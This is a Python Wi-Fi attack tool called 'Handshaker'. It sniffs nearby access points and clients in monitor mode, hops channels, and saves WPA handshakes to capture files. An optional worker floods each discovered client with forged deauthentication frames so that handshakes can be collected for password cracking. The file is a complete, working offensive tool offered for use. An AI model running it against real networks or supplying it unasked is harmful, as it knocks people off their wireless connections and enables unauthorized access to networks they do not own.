#!/usr/bin/env python3
import argparse
import os
import threading
import time
import subprocess
from datetime import datetime

from scapy.all import *
import urwid

# ------------- Globals -------------
networks = {}  # BSSID -> {'ssid': SSID, 'channel': ch, 'clients': {mac: last_seen}}
logs = []
log_lock = threading.Lock()
cap_files = {}  # filename -> PcapWriter

stop_threads = False

# ----------- MAC Utility --------------
def is_unicast(mac):
    try:
        if not mac or len(mac.split(':')) != 6:
            return False
        first_octet = int(mac.split(':')[0], 16)
        return (first_octet & 1) == 0
    except Exception:
        return False

# --------- Argument Parsing ---------
def parse_args():
    parser = argparse.ArgumentParser(
        description='Capture WPA handshakes and manage Wi-Fi clients (with optional deauth).'
    )
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface in monitor mode')
    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
    parser.add_argument('-s', '--target-ssid', help='Filter by SSID')
    parser.add_argument('-b', '--target-bssid', help='Filter by BSSID')
    parser.add_argument('-t', '--timeout', type=int, default=60, help='Client timeout (seconds)')
    parser.add_argument('-d', '--deauth', action='store_true', help='Enable deauthentication')
    parser.add_argument('--interval', type=int, default=10, help='Deauth burst interval (seconds)')
    parser.add_argument('--output-directory', default='.', help='Directory for .cap files')
    return parser.parse_args()

# ----------- Utilities --------------
def log(msg):
    with log_lock:
        ts = datetime.now().strftime('%H:%M:%S')
        logs.append(f'[{ts}] {msg}')
        if len(logs) > 500:
            logs.pop(0)

def channel_hopper(interface, user_channel=None):
    chs = [1,2,3,4,5,6,7,8,9,10,11]
    i = 0
    while not stop_threads:
        if user_channel:
            ch = user_channel
        else:
            ch = chs[i % len(chs)]
            i += 1
        try:
            subprocess.run(['iwconfig', interface, 'channel', str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f'Switched to channel {ch}')
        except Exception as e:
            log(f'Error changing channel: {e}')
        time.sleep(2 if not user_channel else 5)
        if user_channel:
            break

def get_capfile(ssid, output_dir):
    safe_ssid = ssid if ssid else 'unknown'
    fn = os.path.join(output_dir, f'{safe_ssid}_capture.cap')
    if fn not in cap_files:
        cap_files[fn] = PcapWriter(fn, append=True, sync=True)
    return cap_files[fn]

def cleanup_capfiles():
    for pcap in cap_files.values():
        try:
            pcap.close()
        except:
            pass

# --------- Packet Processing --------
def process_packet(pkt, args):
    # AP Detection
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr2
        ssid = '<hidden>'
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        # Extract channel
        channel = None
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 3 and elt.info:
                channel = elt.info[0]
                break
            elt = elt.payload.getlayer(Dot11Elt)
        if args.target_ssid and ssid != args.target_ssid:
            return
        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            log(f'AP discovered: {ssid} ({bssid}) ch {channel}')
            networks[bssid] = {'ssid': ssid, 'channel': channel, 'clients': {}}
        else:
            networks[bssid]['ssid'] = ssid
            networks[bssid]['channel'] = channel

    # Client Detection (Data or Auth packets)
    if pkt.haslayer(Dot11):
        toDS = pkt[Dot11].FCfield & 0x1
        fromDS = pkt[Dot11].FCfield & 0x2
        addr1, addr2 = pkt[Dot11].addr1, pkt[Dot11].addr2
        bssid = None
        client = None
        if fromDS and not toDS:
            bssid = addr2
            client = addr1
        elif toDS and not fromDS:
            bssid = addr1
            client = addr2
        else:
            return
        if not bssid or not client or not is_unicast(client):
            return

        # NEW: Only track clients if AP is already known, when filtering
        if (args.target_ssid or args.target_bssid) and bssid not in networks:
            return

        if args.target_bssid and bssid.lower() != args.target_bssid.lower():
            return
        if bssid not in networks:
            networks[bssid] = {'ssid': '', 'channel': None, 'clients': {}}
        if client not in networks[bssid]['clients']:
            log(f'Client {client} seen on {bssid}')
        networks[bssid]['clients'][client] = time.time()

    # EAPOL (Handshake)
    if pkt.haslayer(EAPOL):
        bssid = None
        if pkt[Dot11].addr2 in networks:
            bssid = pkt[Dot11].addr2
        elif pkt[Dot11].addr1 in networks:
            bssid = pkt[Dot11].addr1
        ssid = networks.get(bssid, {}).get('ssid', 'unknown')
        log(f'Handshake/EAPOL captured for SSID {ssid} ({bssid})')
        capfile = get_capfile(ssid, args.output_directory)
        capfile.write(pkt)

    # Save all packets for filtered networks
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr2 if pkt[Dot11].addr2 in networks else pkt[Dot11].addr1
        ssid = networks.get(bssid, {}).get('ssid', None)
        if ssid and args.output_directory:
            capfile = get_capfile(ssid, args.output_directory)
            capfile.write(pkt)

# ----------- Deauth Thread ----------
def deauth_worker(args):
    while not stop_threads:
        for bssid, ap in networks.items():
            for client in list(ap['clients']):
                if not is_unicast(client):
                    continue  # Ignore broadcast/multicast
                pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(pkt, iface=args.interface, count=5, inter=0.1, verbose=0)
                log(f'Deauth sent to {client} on {bssid}')
        time.sleep(args.interval)

# ----------- Timeout Thread ---------
def timeout_worker(timeout):
    while not stop_threads:
        now = time.time()
        for bssid, ap in networks.items():
            to_remove = [c for c, ts in ap['clients'].items() if now - ts > timeout]
            for c in to_remove:
                log(f'Removing inactive client {c} from {bssid}')
                del ap['clients'][c]
        time.sleep(5)

# ----------- Sniffer Thread ---------
def sniffer_worker(args):
    sniff(iface=args.interface, prn=lambda p: process_packet(p, args), store=0, stop_filter=lambda x: stop_threads)

# ------------- UI Section -----------
class HandshakerUI:
    def __init__(self, args):
        self.args = args
        self.ap_list_walker = urwid.SimpleListWalker([])
        self.log_walker = urwid.SimpleListWalker([])
        self.ap_listbox = urwid.ListBox(self.ap_list_walker)
        self.log_listbox = urwid.ListBox(self.log_walker)
        self.layout = urwid.Frame(
            header=urwid.Text("Handshaker: WPA Handshake Sniffer/Deauth Tool — q to quit"),
            body=urwid.Pile([('weight', 3, self.ap_listbox), ('weight', 1, self.log_listbox)])
        )
        self.loop = urwid.MainLoop(self.layout, unhandled_input=self.unhandled_input)

    def unhandled_input(self, k):
        if k in ('q', 'Q'):
            global stop_threads
            stop_threads = True
            raise urwid.ExitMainLoop()

    def update(self, *_):
        # Top: APs and clients
        items = []
        for bssid, ap in networks.items():
            ssid = ap.get('ssid', '<unknown>')
            ch = ap.get('channel', '?')
            header = urwid.Text([('bold', f'{ssid:20}  {bssid:17}  ch{ch}')])
            clients = ap.get('clients', {})
            client_texts = [urwid.Text(f'    ↳ {c}') for c in clients]
            items.append(header)
            items.extend(client_texts)
        self.ap_list_walker[:] = items

        # Bottom: Logs
        with log_lock:
            self.log_walker[:] = [urwid.Text(l) for l in logs[-50:]]
        self.loop.set_alarm_in(1, self.update)

    def run(self):
        self.loop.set_alarm_in(0, self.update)
        self.loop.run()

# ------------- Main -----------------
def main():
    args = parse_args()
    os.makedirs(args.output_directory, exist_ok=True)

    log(f'Handshaker started on {args.interface}')
    if args.channel:
        log(f'Scanning on channel {args.channel}')
    else:
        log('Channel hopping enabled')

    threads = []
    # Channel hopper
    t_ch = threading.Thread(target=channel_hopper, args=(args.interface, args.channel), daemon=True)
    t_ch.start(); threads.append(t_ch)
    # Timeout
    t_to = threading.Thread(target=timeout_worker, args=(args.timeout,), daemon=True)
    t_to.start(); threads.append(t_to)
    # Sniffer
    t_sniff = threading.Thread(target=sniffer_worker, args=(args,), daemon=True)
    t_sniff.start(); threads.append(t_sniff)
    # Deauth
    if args.deauth:
        t_deauth = threading.Thread(target=deauth_worker, args=(args,), daemon=True)
        t_deauth.start(); threads.append(t_deauth)

    # UI
    try:
        ui = HandshakerUI(args)
        ui.run()
    except KeyboardInterrupt:
        pass
    finally:
        global stop_threads
        stop_threads = True
        cleanup_capfiles()
        log('Exiting...')

if __name__ == '__main__':
    main()

